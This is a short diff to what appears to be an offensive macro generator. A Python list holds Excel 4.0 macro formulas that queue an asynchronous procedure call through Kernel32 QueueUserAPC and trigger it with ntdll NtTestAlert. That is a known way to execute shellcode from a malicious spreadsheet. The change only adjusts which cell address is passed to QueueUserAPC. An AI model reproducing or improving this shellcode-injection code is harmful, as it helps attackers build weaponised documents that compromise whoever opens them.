@@ -75,7 +75,7 @@ memory64 = ['=R1C3()',
             '=SET.VALUE(R1C1, R1C1 + 1)',
             '=SELECT(, "R[1]C")',
             '=NEXT()',
-            '=CALL("Kernel32","QueueUserAPC","JJJJ",R2C100,-2,0)',
+            '=CALL("Kernel32","QueueUserAPC","JJJJ",R2C2,-2,0)',
             '=CALL("ntdll","NtTestAlert","J")',
             '=WORKBOOK.ACTIVATE("Sheet1")',
             '=HALT()']
